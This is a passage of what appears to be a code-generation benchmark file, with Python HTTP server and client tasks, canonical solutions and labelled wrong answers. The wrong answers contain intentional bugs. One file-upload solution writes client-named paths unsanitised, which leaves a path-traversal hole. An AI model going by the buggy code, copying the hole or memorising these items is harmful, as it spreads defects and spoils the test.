self.path, self.headers, and request body)\n  Output: None (sends response directly to client)\n\n- read_chunks(): generator - Helper method to read chunked transfer encoding\n  Input: None\n  Output: generator yielding bytes - The chunks of data from the request body\n\nContext Manager:\n- serve(): contextmanager - Creates and manages an HTTP server in a separate thread\n  Input: None\n  Output: generator yielding str - The server URL (e.g., \"http://localhost:12345\")\n  Note: Automatically cleans up server resources when context exits",
    "Canonical_solution": "from http.server import BaseHTTPRequestHandler, HTTPServer\nimport threading\nimport contextlib\nimport json\nimport gzip\nfrom collections import ChainMap\n\nclass HTTPTestHandler(BaseHTTPRequestHandler):\n    static_files = {\n        \"/index/realfile\": b\"\\n\".join([b\"some test data\"] * 1000),\n        \"/index/otherfile\": b\"\\n\".join([b\"some test data\"] * 1000),\n        \"/data/20020401\": b'<a href=\"http://testserver/index/realfile\">Link</a>',\n    }\n    dynamic_files = {}\n    files = ChainMap(dynamic_files, static_files)\n\n    def _respond(self, code=200, headers=None, data=b\"\"):\n        headers = headers or {}\n        headers.update({\"User-Agent\": \"test\"})\n        self.send_response(code)\n        for k, v in headers.items():\n            self.send_header(k, str(v))\n        self.end_headers()\n        if data:\n            self.wfile.write(data)\n\n    def do_GET(self):\n        file_path = self.path\n        if file_path.endswith(\"/\") and file_path.rstrip(\"/\") in self.files:\n            file_path = file_path.rstrip(\"/\")\n        file_data = self.files.get(file_path)\n        \n        if \"give_path\" in self.headers:\n            return self._respond(200, data=json.dumps({\"path\": self.path}).encode())\n        if file_data is None:\n            return self._respond(404)\n\n        status = 200\n        if \"Range\" in self.headers and \"ignore_range\" not in self.headers:\n            ran = self.headers[\"Range\"]\n            b, ran = ran.split(\"=\")\n            start, end = ran.split(\"-\")\n            if start:\n                file_data = file_data[int(start) : (int(end) + 1) if end else None]\n            else:\n                l = len(file_data)\n                file_data = file_data[-int(end) :]\n            if \"use_206\" in self.headers:\n                status = 206\n\n        if \"give_length\" in self.headers:\n            if \"gzip_encoding\" in self.headers:\n                file_data = gzip.compress(file_data)\n                response_headers = {\n                    \"Content-Length\": len(file_data),\n                    \"Content-Encoding\": \"gzip\",\n                }\n            else:\n                response_headers = {\"Content-Length\": len(file_data)}\n            self._respond(status, response_headers, file_data)\n        else:\n            self._respond(status, data=file_data)\n\n    def do_POST(self):\n        length = self.headers.get(\"Content-Length\")\n        file_path = self.path.rstrip(\"/\")\n        if length is None:\n            assert self.headers.get(\"Transfer-Encoding\") == \"chunked\"\n            self.files[file_path] = b\"\".join(self.read_chunks())\n        else:\n            self.files[file_path] = self.rfile.read(int(length))\n        self._respond(200)\n\n    def read_chunks(self):\n        length = -1\n        while length != 0:\n            line = self.rfile.readline().strip()\n            if len(line) == 0:\n                length = 0\n            else:\n                length = int(line, 16)\n            yield self.rfile.read(length)\n            self.rfile.readline()\n\n@contextlib.contextmanager\ndef serve():\n    server_address = (\"\", 0)\n    httpd = HTTPServer(server_address, HTTPTestHandler)\n    th = threading.Thread(target=httpd.serve_forever)\n    th.daemon = True\n    th.start()\n    try:\n        yield f\"http://{httpd.server_name}:{httpd.server_port}\"\n    finally:\n        httpd.socket.close()\n        httpd.shutdown()\n        th.join()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "from http.server import BaseHTTPRequestHandler, HTTPServer\nfrom urllib.parse import unquote\nfrom collections import ChainMap\nimport gzip\nimport io\nimport threading\nimport socketserver\n\nclass HTTPTestHandler(BaseHTTPRequestHandler):\n    def __init__(self, request, client_address, server):\n        self.static_files = {}\n        self.dynamic_files = {}\n        self.files = ChainMap(self.dynamic_files, self.static_files)\n        super().__init__(request, client_address, server)\n\n    def _respond(self, code=200, headers=None, data=b\"\"):\n        self.send_response(code)\n        if headers:\n            for k, v in headers.items():\n                self.send_header(k, v)\n        self.end_headers()\n        self.wfile.write(data)\n\n    def do_GET(self):\n        path = self.path\n        if path.startswith('/static/'):\n            file_path = unquote(path[len('/static/'):])\n            if file_path in self.static_files:\n                self._respond(200, {'Content-Type': 'text/plain'}, self.static_files[file_path])\n            else:\n                self._respond(404)\n        elif path.startswith('/dynamic/'):\n            file_path = unquote(path[len('/dynamic/'):])\n            if file_path in self.dynamic_files:\n                self._respond(200, {'Content-Type': 'text/plain'}, self.dynamic_files[file_path])\n            else:\n                self._respond(404)\n        else:\n            self._respond(200, {'Content-Type': 'text/plain'}, b\"Hello, world!\")\n\n    def do_POST(self):\n        content_length = int(self.headers['Content-Length'])\n        post_data = self.rfile.read(content_length)\n        path = self.path\n        if path.startswith('/dynamic/'):\n            file_path = unquote(path[len('/dynamic/'):])\n            self.dynamic_files[file_path] = post_data\n            self._respond(200, {'Content-Type': 'text/plain'}, b\"Received POST data\")\n        else:\n            self._respond(405)\n\n    def read_chunks(self):\n        while True:\n            chunk = self.rfile.read(16384)\n            if not chunk:\n                break\n            yield chunk\n\ndef serve():\n    with socketserver.TCPServer((\"\", 12345), HTTPTestHandler) as httpd:\n        url = f\"http://localhost:12345\"\n        print(f\"Serving at {url}\")\n        try:\n            httpd.serve_forever()\n        except KeyboardInterrupt:\n            print(\"Shutting down server...\")\n            httpd.shutdown()\n            return url\n\nif __name__ == \"__main__\":\n    with threading.Thread(target=serve) as t:\n        t.join()"
  },
  {
    "Task_id": 218,
    "Instruction": "Task Description: Create a Python class that implements an HTTP server for testing purposes, allowing communication between a test suite and a web browser through queues, and handling HTML snippet transmission.\n\nClass Description: The class should implement a custom HTTP server that can receive HTML snippets from a test suite and serve them to a web browser, while also facilitating bidirectional communication between the test suite and server using thread-safe queues.\n\nAttributes:\n\nLOCAL_IP: [str] - The local IP address to bind the server to (default: '127.0.0.1')\nPORT: [int] - The port number to run the server on (default: 28546)\nREQUEST_HANDLER_CLASS: [class] - The custom request handler class to use (default: HTMLSnippetSender)\nto_server_queue: [Queue] - Queue for sending data from test suite to server\nfrom_server_queue: [Queue] - Queue for receiving data from server to test suite\nserver: [HTTPServer] - The HTTP server instance\nserver_thread: [Thread] - Thread running the server\n\nMethods:\n\nsetUpClass: [classmethod]() -> None - Class method to initialize the server and queues before tests\ntearDownClass: [classmethod]() -> None - Class method to clean up server resources after tests\nsend_to_server: [method](value: Any) -> None - Sends data to the server through the input queue\nrecv_from_server: [method](non_blocking: bool = False) -> Any - Receives data from server through output queue (optionally non-blocking)\nopen_url: [method](path: str) -> None - Constructs and opens a URL to the test server in the browser\n\nHTMLSnippetSender Class Description: A custom HTTP request handler that manages HTML snippet transmission between server and browser.\n\nAttributes:\n\nlast_html: [bytes] - Buffer storing the last received HTML snippet\n\nMethods:\n\ndo_GET: [method]() -> None - Handles GET requests, serving the last HTML snippet for root path\nget_last_html: [method]() -> bytes - Retrieves the most recent HTML snippet from the queue\nrecv_from_testsuite: [method](non_blocking: bool = False) -> Any - Receives data from test suite queue (optionally non-blocking)\nsend_to_testsuite: [method](value: Any) -> None - Sends data to test suite through output queue\nlog_request: [method](code: str = '-', size: str = '-') -> None - Overrides default request logging (empty implementation)",
    "Canonical_solution": "from http.server import HTTPServer, BaseHTTPRequestHandler\nfrom queue import Queue\nfrom threading import Thread\nfrom urllib.parse import urlunsplit\n\nclass HTMLSnippetSender(BaseHTTPRequestHandler):\n    last_html = b''\n\n    def get_last_html(self):\n        while True:\n            value = self.recv_from_testsuite(non_blocking=True)\n            if value is None:\n                break\n            self.last_html = value\n        return self.last_html\n\n    def do_GET(self):\n        if self.path == '/':\n            self.send_response(200)\n            self.send_header('Content-Type', 'text/html; charset=utf-8')\n            self.end_headers()\n            self.wfile.write(self.get_last_html().encode('utf-8'))\n        else:\n            self.send_response(404)\n            self.end_headers()\n\n    def recv_from_testsuite(self, non_blocking=False):\n        q = self.server.in_queue\n        if non_blocking:\n            return None if q.empty() else q.get_nowait()\n        return q.get()\n\n    def send_to_testsuite(self, value):\n        self.server.out_queue.put(value)\n\n    def log_request(self, code='-', size='-'):\n        pass\n\nclass BaseBrowserTest:\n    LOCAL_IP = '127.0.0.1'\n    PORT = 28546\n    REQUEST_HANDLER_CLASS = HTMLSnippetSender\n\n    @classmethod\n    def setUpClass(cls):\n        cls.to_server_queue = Queue()\n        cls.from_server_queue = Queue()\n        cls.server = HTTPServer((cls.LOCAL_IP, cls.PORT),\n                              cls.REQUEST_HANDLER_CLASS)\n        cls.server.in_queue = cls.to_server_queue\n        cls.server.out_queue = cls.from_server_queue\n        cls.server_thread = Thread(target=cls.server.serve_forever)\n        cls.server_thread.daemon = True\n        cls.server_thread.start()\n\n    @classmethod\n    def tearDownClass(cls):\n        cls.server.shutdown()\n        cls.server.server_close()\n\n    def send_to_server(self, value):\n        self.to_server_queue.put(value)\n\n    def recv_from_server(self, non_blocking=False):\n        q = self.from_server_queue\n        if non_blocking:\n            return None if q.empty() else q.get_nowait()\n        return q.get()\n\n    def open_url(self, path):\n        self.driver.get(urlunsplit(\n            ('http', '{}:{}'.format(\n                self.LOCAL_IP, self.PORT), path, '', '')))",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "import http.server\nimport socketserver\nimport threading\nfrom queue import Queue\nimport webbrowser\nimport time\n\nclass HTMLSnippetSender(http.server.BaseHTTPRequestHandler):\n    def __init__(self, request, client_address, server):\n        self.last_html = b''\n        super().__init__(request, client_address, server)\n\n    def do_GET(self):\n        if self.path == '/':\n            self.send_response(200)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n            self.wfile.write(self.last_html)\n        else:\n            self.send_error(404, 'File not found')\n\n    def get_last_html(self):\n        return self.last_html\n\n    def recv_from_testsuite(self, non_blocking=False):\n        if non_blocking:\n            try:\n                return self.from_server_queue.get_nowait()\n            except Queue.Empty:\n                return None\n        else:\n            return self.from_server_queue.get()\n\n    def send_to_testsuite(self, value):\n        self.to_server_queue.put(value)\n\n    def log_request(self, code='-', size='-'):\n        pass\n\n\nclass TestServer:\n    LOCAL_IP = '127.0.0.1'\n    PORT = 28546\n    REQUEST_HANDLER_CLASS = HTMLSnippetSender\n\n    def __init__(self):\n        self.to_server_queue = Queue()\n        self.from_server_queue = Queue()\n        self.server = None\n        self.server_thread = None\n\n    @classmethod\n    def setUpClass(cls):\n        cls.server = socketserver.TCPServer((cls.LOCAL_IP, cls.PORT), cls.REQUEST_HANDLER_CLASS)\n        cls.server_thread = threading.Thread(target=cls.server.serve_forever)\n        cls.server_thread.start()\n\n    @classmethod\n    def tearDownClass(cls):\n        cls.server.shutdown()\n        cls.server_thread.join()\n\n    def send_to_server(self, value):\n        self.to_server_queue.put(value)\n\n    def recv_from_server(self, non_blocking=False):\n        if non_blocking:\n            try:\n                return self.from_server_queue.get_nowait()\n            except Queue.Empty:\n                return None\n        else:\n            return self.from_server_queue.get()\n\n    def open_url(self, path):\n        url = f'http://{self.LOCAL_IP}:{self.PORT}{path}'\n        webbrowser.open(url)\n\n\nclass TestServerInstance(TestServer):\n    pass"
  },
  {
    "Task_id": 219,
    "Instruction": "Task Description: Create a Python HTTP server that handles POST requests, processes JSON data, and returns a modified JSON response. The server should be implemented using Python's built-in http.server module with customizable port and request handler.\n\nClass Description: The solution consists of two classes: PostHandler (request handler) and HTTPServerWrapper (server manager). PostHandler processes incoming POST requests and their JSON data, while HTTPServerWrapper manages the server lifecycle.\n\nAttributes:\n- port: int - The port number on which the HTTP server will listen (default: 8888)\n- handler_class: class - The request handler class to be used (default: PostHandler)\n- server_address: tuple - A tuple containing the server address and port\n- httpd: HTTPServer - The HTTP server instance\n\nMethods:\n- PostHandler.do_POST() -> None - Handles incoming POST requests, reads JSON data, processes it, and sends back a JSON response\n- PostHandler.process_data(data: dict) -> dict - Processes the incoming JSON data (can be overridden for custom processing)\n- HTTPServerWrapper.__init__(port: int = 8888, handler_class: class = PostHandler) -> None - Initializes the server with specified port and handler\n- HTTPServerWrapper.run() -> None - Starts the HTTP server and begins serving requests indefinitely",
    "Canonical_solution": "from http.server import BaseHTTPRequestHandler, HTTPServer\nimport json\n\nclass PostHandler(BaseHTTPRequestHandler):\n    def do_POST(self):\n        content_length = int(self.headers['Content-Length'])\n        post_data = self.rfile.read(content_length)\n        json_data = json.loads(post_data)\n\n        new_json_data = self.process_data(json_data)\n\n        self.send_response(200)\n        self.send_header(\"Content-type\", \"application/json\")\n        self.end_headers()\n        self.wfile.write(json.dumps(new_json_data).encode('utf-8'))\n\n    def process_data(self, data):\n        return data\n\nclass HTTPServerWrapper:\n    def __init__(self, port=8888, handler_class=PostHandler):\n        self.port = port\n        self.handler_class = handler_class\n        self.server_address = ('', self.port)\n        self.httpd = HTTPServer(self.server_address, self.handler_class)\n\n    def run(self):\n        print('Starting httpd on port {}'.format(self.port))\n        self.httpd.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "import http.server\nimport json\nimport socketserver\n\nclass PostHandler(http.server.BaseHTTPRequestHandler):\n    def do_POST(self):\n        content_length = int(self.headers['Content-Length'])\n        post_data = self.rfile.read(content_length)\n        data = json.loads(post_data.decode('utf-8'))\n        processed_data = self.process_data(data)\n        self.send_response(200)\n        self.send_header('Content-type', 'application/json')\n        self.end_headers()\n        self.wfile.write(json.dumps(processed_data).encode('utf-8'))\n\n    def process_data(self, data):\n        return {key: value * 2 for key, value in data.items()}\n\n\nclass HTTPServerWrapper:\n    def __init__(self, port=8888, handler_class=PostHandler):\n        self.port = port\n        self.handler_class = handler_class\n        self.server_address = ('', port)\n        self.httpd = None\n\n    def run(self):\n        self.httpd = socketserver.TCPServer(self.server_address, self.handler_class)\n        print(f'Server running on port {self.port}')\n        self.httpd.serve_forever()"
  },
  {
    "Task_id": 22,
    "Instruction": "Task Description: Implement a class for handling HTTP requests to a server, supporting both GET and POST methods, with optional proxy support and response parsing capabilities.\n\nClass Description: WARequest is a class designed to facilitate HTTP communication with a server. It provides methods for sending GET and POST requests, handling response parsing, and managing request parameters and headers. The class supports both direct connections and proxy connections.\n\nAttributes:\n\npvars: [list] - List of variables that can be parsed from the response\nport: [int] - Port number for the HTTP connection (default: 443)\ntype: [str] - HTTP request type (GET or POST)\nparser: [ResponseParser] - Parser object for processing the response\nparams: [list] - List of tuples containing request parameters\nheaders: [dict] - Dictionary of HTTP headers to be sent with the request\nsent: [bool] - Flag indicating if the request has been sent\nresponse: [HTTPResponse] - The response object from the server\nurl: [str] - The target URL for the request\n\nMethods:\n\nsetParsableVariables: [setParsableVariables](pvars: list) -> None - Sets the list of variables that can be parsed from the response\naddParam: [addParam](name: str, value: str) -> None - Adds a parameter to the request\nremoveParam: [removeParam](name: str) -> None - Removes a parameter from the request\naddHeaderField: [addHeaderField](name: str, value: str) -> None - Adds a header field to the request\nclearParams: [clearParams]() -> None - Clears all request parameters\ngetUserAgent: [getUserAgent]() -> str - Returns the user agent string\nsend: [send](parser: ResponseParser = None) -> dict - Sends the request (GET or POST based on type) and returns parsed response\nsetParser: [setParser](parser: ResponseParser) -> None - Sets the response parser\ngetConnectionParameters: [getConnectionParameters]() -> tuple - Returns host, port, and path from the URL\nsendGetRequest: [sendGetRequest](parser: ResponseParser = None) -> dict - Sends a GET request and returns parsed response\nsendPostRequest: [sendPostRequest](parser: ResponseParser = None) -> dict - Sends a POST request and returns parsed response\nsendRequest: [sendRequest](host: str, port: int, path: str, headers: dict, params: list, reqType: str = \"GET\") -> HTTPResponse - Static method to send a direct HTTP request\nsendRequestWithProxy: [sendRequestWithProxy](host: str, port: int, path: str, headers: dict, params: list, proxy: HttpProxy) -> dict - Static method to send a request through a proxy\nbuild_get_url: [build_get_url](host: str, path: str, params: list) -> str - Static method to build a GET URL\nbuild_headers: [build_headers](headers_tuple: dict) -> list - Static method to convert headers dictionary to curl format",
    "Canonical_solution": "import urllib\nimport sys\nimport os\nimport logging\nfrom http import client as httplib\nfrom urllib.parse import urlencode\nfrom .httpproxy import HttpProxy\nfrom yowsup.env import YowsupEnv\n\nlogger = logging.getLogger(__name__)\n\nclass WARequest:\n    OK = 200\n\n    def __init__(self):\n        self.pvars = []\n        self.port = 443\n        self.type = \"GET\"\n        self.parser = None\n        self.params = []\n        self.headers = {}\n        self.sent = False\n        self.response = None\n\n    def setParsableVariables(self, pvars):\n        self.pvars = pvars\n\n    def addParam(self, name, value):\n        self.params.append((name, value))\n\n    def removeParam(self, name):\n        for i in range(0, len(self.params)):\n            if self.params[i][0] == name:\n                del self.params[i]\n\n    def addHeaderField(self, name, value):\n        self.headers[name] = value\n\n    def clearParams(self):\n        self.params = []\n\n    def getUserAgent(self):\n        return YowsupEnv.getCurrent().getUserAgent()\n\n    def send(self, parser=None):\n        if self.type == \"POST\":\n            return self.sendPostRequest(parser)\n        return self.sendGetRequest(parser)\n\n    def setParser(self, parser):\n        if isinstance(parser, ResponseParser):\n            self.parser = parser\n        else:\n            logger.error(\"Invalid parser\")\n\n    def getConnectionParameters(self):\n        if not self.url:\n            return \"\", \"\", self.port\n\n        try:\n            url = self.url.split(\"://\", 1)\n            url = url[0] if len(url) == 1 else url[1]\n            host, path = url.split('/', 1)\n        except ValueError:\n            host = url\n            path = \"\"\n\n        path = \"/\" + path\n        return host, self.port, path\n\n    def sendGetRequest(self, parser=None):\n        self.response = None\n        params = self.params\n        parser = parser or self.parser or ResponseParser()\n        headers = dict(list({\"User-Agent\": self.getUserAgent(),\n                           \"Accept\": parser.getMeta()\n                          }.items()) + list(self.headers.items()))\n\n        host, port, path = self.getConnectionParameters()\n        proxy = HttpProxy.getFromEnviron()\n        if proxy is None:\n            self.response = WARequest.sendRequest(host, port, path, headers, params, \"GET\")\n            if not self.response.status == WARequest.OK:\n                logger.error(\"Request not success, status was %s\" % self.response.status)\n                return {}\n\n            data = self.response.read()\n            logger.info(data)\n            self.sent = True\n            return parser.parse(data.decode(), self.pvars)\n        else:\n            logger.info(\"Request with proxy\")\n            self.response = WARequest.sendRequestWithProxy(host, port, path, headers, params, proxy)\n            logger.info(self.response)\n            return self.response\n\n    def sendPostRequest(self, parser=None):\n        self.response = None\n        params = self.params\n        parser = parser or self.parser or ResponseParser()\n        headers = dict(list({\"User-Agent\": self.getUserAgent(),\n                           \"Accept\": parser.getMeta(),\n                           \"Content-Type\": \"application/x-www-form-urlencoded\"\n                          }.items()) + list(self.headers.items()))\n\n        host, port, path = self.getConnectionParameters()\n        self.response = WARequest.sendRequest(host, port, path, headers, params, \"POST\")\n\n        if not self.response.status == WARequest.OK:\n            logger.error(\"Request not success, status was %s\" % self.response.status)\n            return {}\n\n        data = self.response.read()\n        logger.info(data)\n        self.sent = True\n        return parser.parse(data.decode(), self.pvars)\n\n    @staticmethod\n    def sendRequest(host, port, path, headers, params, reqType=\"GET\"):\n        params = urlencode(params)\n        path = path + \"?\" + params if reqType == \"GET\" and params else path\n\n        if len(headers):\n            logger.debug(headers)\n        if len(params):\n            logger.debug(params)\n\n        logger.debug(\"Opening connection to %s\" % host)\n        conn = httplib.HTTPSConnection(host, port) if port == 443 else httplib.HTTPConnection(host, port)\n\n        logger.debug(\"Sending %s request to %s\" % (reqType, path))\n        conn.request(reqType, path, params, headers)\n        response = conn.getresponse()\n        return response\n\n    @staticmethod\n    def sendRequestWithProxy(host, port, path, headers, params, proxy):\n        import pycurl\n        import json\n        from io import BytesIO\n        logger.info(\"SENDING PROXY REQUEST WITH %s\" % proxy.getHost())\n        bytes_buffer = BytesIO()\n        c = pycurl.Curl()\n        c.setopt(pycurl.URL, WARequest.build_get_url(host, path, params))\n        c.setopt(pycurl.PROXY, proxy.getHost())\n        c.setopt(pycurl.PROXYPORT, proxy.getPort())\n        if proxy.getUserName() is not None:\n            c.setopt(pycurl.PROXYUSERPWD, \"%s:%s\" % (proxy.getUser(), proxy.getPassword()))\n        c.setopt(pycurl.PORT, port)\n        c.setopt(pycurl.HTTPHEADER, WARequest.build_headers(headers))\n        c.setopt(pycurl.WRITEDATA, bytes_buffer)\n        c.perform()\n        c.close()\n        data = bytes_buffer.getvalue().decode('utf-8')\n        return json.loads(data)\n\n    @staticmethod\n    def build_get_url(host, path, params):\n        params = urlencode(params)\n        url = 'https://' + host + path + \"?\" + params\n        return url\n\n    @staticmethod\n    def build_headers(headers_tuple):\n        headers_array = []\n        for idx in headers_tuple:\n            headers_array.append(idx + \":\" + headers_tuple[idx])\n        return headers_array",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "class WARequest:\n    def __init__(self, url: str, type: str = \"GET\", port: int = 443):\n        self.pvars = []\n        self.port = port\n        self.type = type\n        self.parser = None\n        self.params = []\n        self.headers = {}\n        self.sent = False\n        self.response = None\n        self.url = url\n\n    def setParsableVariables(self, pvars: list) -> None:\n        self.pvars = pvars\n\n    def addParam(self, name: str, value: str) -> None:\n        self.params.append((name, value))\n\n    def removeParam(self, name: str) -> None:\n        for i, (n, v) in enumerate(self.params):\n            if n == name:\n                del self.params[i]\n                break\n\n    def addHeaderField(self, name: str, value: str) -> None:\n        self.headers[name] = value\n\n    def clearParams(self) -> None:\n        self.params.clear()\n\n    def getUserAgent(self) -> str:\n        return \"WARequest/1.0\"\n\n    def send(self, parser: ResponseParser = None) -> dict:\n        if parser is not None:\n            self.setParser(parser)\n        if self.type == \"GET\":\n            return self.sendGetRequest()\n        else:\n            return self.sendPostRequest()\n\n    def setParser(self, parser: ResponseParser) -> None:\n        self.parser = parser\n\n    def getConnectionParameters(self) -> tuple:\n        from urllib.parse import urlparse\n        parsed = urlparse(self.url)\n        return parsed.hostname, self.port, parsed.path\n\n    def sendGetRequest(self, parser: ResponseParser = None) -> dict:\n        host, port, path = self.getConnectionParameters()\n        url = self.build_get_url(host, path, self.params)\n        headers = self.build_headers(self.headers)\n        self.response = sendRequest(host, port, path, headers, self.params, \"GET\")\n        self.sent = True\n        if self.parser:\n            return self.parser.parse_response(self.response, self.pvars)\n        return {}\n\n    def sendPostRequest(self, parser: ResponseParser = None) -> dict:\n        host, port, path = self.getConnectionParameters()\n        headers = self.build_headers(self.headers)\n        self.response = sendRequest(host, port, path, headers, self.params, \"POST\")\n        self.sent = True\n        if self.parser:\n            return self.parser.parse_response(self.response, self.pvars)\n        return {}\n\n    def sendRequest(host: str, port: int, path: str, headers: dict, params: list, reqType: str = \"GET\") -> HTTPResponse:\n        pass\n\n    def sendRequestWithProxy(host: str, port: int, path: str, headers: dict, params: list, proxy: HttpProxy) -> dict:\n        pass\n\n    def build_get_url(host: str, path: str, params: list) -> str:\n        from urllib.parse import urlencode\n        query = urlencode(params)\n        return f\"{host}{path}?{query}\"\n\n    def build_headers(self, headers_tuple: dict) -> list:\n        return [f\"{k}: {v}\" for k, v in headers_tuple.items()]"
  },
  {
    "Task_id": 220,
    "Instruction": "Task Description: Create a Python class that implements an HTTP server using the `http.server` module to handle GET and POST requests, with custom response handling and error management.\n\nClass Description: The `YamlComposerHttp` class encapsulates an HTTP server that listens on a specified port and handles incoming GET and POST requests. It includes an inner class `_HttpServer` that extends `BaseHTTPRequestHandler` to define custom request handling logic.\n\nAttributes:\n\n- args: [object] - Configuration object containing server parameters, including the HTTP port to listen on.\n\nMethods:\n\n- __init__(args) -> None - Initializes the `YamlComposerHttp` instance with the provided configuration.\n  - Input: \n    - args: [object] - Configuration object containing server parameters.\n  - Output: None\n\n- run() -> None - Starts the HTTP server and begins listening for incoming requests indefinitely until interrupted.\n  - Input: None\n  - Output: None\n\nInner Class: _HttpServer(BaseHTTPRequestHandler)\n\nMethods:\n\n- _set_response(msg: str, code: int = 200) -> None - Helper method to send an HTTP response with the specified message and status code.\n  - Input:\n    - msg: [str] - The message to include in the response body.\n    - code: [int] - The HTTP status code (default: 200).\n  - Output: None\n\n- do_GET() -> None - Handles incoming GET requests. Responds with a default HTML page for the root path ('/') or an error for invalid paths.\n  - Input: None\n  - Output: None\n\n- do_POST() -> None - Handles incoming POST requests. Processes form data from '/generate' path or returns an error for invalid paths.\n  - Input: None\n  - Output: None",
    "Canonical_solution": "from http.server import BaseHTTPRequestHandler, HTTPServer\nfrom urllib.parse import parse_qs\n\nclass YamlComposerHttp:\n    def __init__(self, args):\n        self.args = args\n\n    class _HttpServer(BaseHTTPRequestHandler):\n        def _set_response(self, msg: str, code: int = 200):\n            self.send_response(code)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n            self.wfile.write(msg.encode('utf-8'))\n\n        def do_GET(self):\n            if str(self.path) != '/':\n                self._set_response('<h1>\"%s\" is not a valid entrypoint</h1>' % self.path, 400)\n                return\n            self._set_response(self.default_html)\n\n        def do_POST(self):\n            if str(self.path) != '/generate':\n                self._set_response('<h1>\"%s\" is not a valid entrypoint</h1>' % self.path, 400)\n                return\n            content_length = int(self.headers['Content-Length'])\n            data = self.rfile.read(content_length)\n            data = {k: v[0] for k, v in parse_qs(data.decode('utf-8')).items()}\n            self._set_response(*parse_http_data(data, self.args))\n\n    def run(self):\n        httpd = HTTPServer(('0.0.0.0', self.args.http_port), self._HttpServer)\n        try:\n            httpd.serve_forever()\n        except KeyboardInterrupt:\n            pass\n        finally:\n            httpd.server_close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "class YamlComposerHttp:\n    def __init__(self, args):\n        self.args = args\n        self.server_address = ('', self.args.port)\n        self.httpd = http.server.HTTPServer(self.server_address, self._HttpServer)\n\n    def run(self):\n        print(f\"Starting server on port {self.args.port}\")\n        try:\n            self.httpd.serve_forever()\n        except KeyboardInterrupt:\n            print(\"Server shutting down...\")\n            self.httpd.shutdown()\n\nclass _HttpServer(http.server.BaseHTTPRequestHandler):\n    def _set_response(self, msg: str, code: int = 200) -> None:\n        self.send_response(code)\n        self.send_header('Content-type', 'text/html')\n        self.send_header('Content-Length', str(len(msg.encode())))\n        self.end_headers()\n        self.wfile.write(msg.encode())\n\n    def do_GET(self):\n        if self.path == '/':\n            self._set_response(\"<h1>Welcome to YamlComposerHttp</h1>\")\n        else:\n            self._set_response(f\"<h1>404 Not Found</h1><p>The requested resource {self.path} was not found.</p>\", 404)\n\n    def do_POST(self):\n        if self.path == '/generate':\n            content_length = int(self.headers['Content-Length'])\n            post_data = self.rfile.read(content_length).decode()\n            self._set_response(f\"<h1>POST Request Received</h1><p>Form data: {post_data}</p>\")\n        else:\n            self._set_response(f\"<h1>405 Method Not Allowed</h1><p>The POST method is not allowed for {self.path}</p>\", 405)"
  },
  {
    "Task_id": 221,
    "Instruction": "Task Description: Create a Python class that implements an HTTP server capable of handling POST requests to receive and process file uploads with metadata, then store the files locally and register them via an API.\n\nClass Description: HTTPPostHandler is a class that sets up an HTTP server to handle file uploads via POST requests. It processes JSON payloads containing file data (base64 encoded), metadata, and stores the decoded files in a specified directory while registering them through an external API.\n\nAttributes:\n- OUTPUT_DIR: str - The base directory where uploaded files will be stored\n- port: int - The port number on which the HTTP server will listen\n\nMethods:\n- __init__(output_dir: str = '', port: int = 80) -> None - Initializes the HTTPPostHandler with optional output directory and port parameters\n- run() -> None - Starts the HTTP server and begins listening for requests indefinitely\n\nNested Class: Handler (extends BaseHTTPRequestHandler)\nMethods:\n- _set_headers() -> None - Sets the HTTP response headers for successful requests\n- do_POST() -> None - Handles POST requests, processes the incoming file data and metadata, saves the file to disk, and registers it via API",
    "Canonical_solution": "import os\nimport sys\nimport json\nimport string\nimport random\nimport base64\nimport requests\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass HTTPPostHandler:\n    def __init__(self, output_dir='', port=80):\n        self.OUTPUT_DIR = output_dir\n        self.port = port\n\n    class Handler(BaseHTTPRequestHandler):\n        def _set_headers(self):\n            self.send_response(200)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n\n        def do_POST(self):\n            self._set_headers()\n            self.data_string = self.rfile.read(int(self.headers['Content-Length']))\n            self.send_response(200)\n            self.end_headers()\n\n            json_data = json.loads(self.data_string)\n            b64_data = json_data.get('data')\n            filetype = json_data.get('type')\n            owner = json_data.get('owner')\n            module = json_data.get('module')\n            session = json_data.get('session')\n            filename = json_data.get('filename')\n\n            data = base64.b64decode(b64_data)\n            if session.startswith('_b64'):\n                session = base64.b64decode(session[6:]).decode('ascii')\n\n            if not filetype.startswith('.'):\n                filetype = '.' + filetype\n\n            if not filename:\n                filename = str().join([random.choice(string.ascii_lowercase + string.digits) for _ in range(3)]) + filetype\n\n            output_path = os.path.join(self.OUTPUT_DIR, owner, 'files', filename)\n\n            requests.post(\"http://0.0.0.0/api/file/add\", {\"filename\": filename, \"owner\": owner, \"module\": module, \"session\": session})\n\n            with open(output_path, 'wb') as fp:\n                fp.write(data)\n\n    def run(self):\n        httpd = HTTPServer(('0.0.0.0', self.port), self.Handler)\n        httpd.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "from http.server import BaseHTTPRequestHandler, HTTPServer\nimport json\nimport base64\nimport os\nimport requests\n\nclass HTTPPostHandler:\n    OUTPUT_DIR = 'uploads'\n    port = 80\n\n    def __init__(self, output_dir: str = '', port: int = 80) -> None:\n        self.OUTPUT_DIR = output_dir or 'uploads'\n        self.port = port\n        os.makedirs(self.OUTPUT_DIR, exist_ok=True)\n\n    def run(self) -> None:\n        server_address = ('', self.port)\n        httpd = HTTPServer(server_address, self.Handler)\n        print(f'Starting HTTP server on port {self.port}...')\n        try:\n            httpd.serve_forever()\n        except KeyboardInterrupt:\n            print('Shutting down HTTP server...')\n            httpd.shutdown()\n\n    class Handler(BaseHTTPRequestHandler):\n        def _set_headers(self) -> None:\n            self.send_response(200)\n            self.send_header('Content-type', 'application/json')\n            self.end_headers()\n\n        def do_POST(self):\n            content_length = int(self.headers['Content-Length'])\n            post_data = self.rfile.read(content_length)\n            data = json.loads(post_data.decode('utf-8'))\n\n            file_data = data.get('file')\n            metadata = data.get('metadata')\n\n            if not file_data or not metadata:\n                self._set_headers()\n                self.wfile.write(b'{\"error\": \"Missing file or metadata\"}')\n                return\n\n            